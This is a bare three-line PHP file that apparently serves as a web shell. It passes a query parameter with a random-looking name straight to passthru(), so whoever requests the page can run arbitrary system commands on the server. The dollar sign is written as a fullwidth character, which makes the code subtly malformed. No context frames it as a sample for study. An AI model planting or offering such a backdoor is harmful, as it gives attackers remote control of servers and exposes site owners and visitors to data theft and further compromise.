<?php
passthru(＄_GET['qe4pG_cD']);
?>
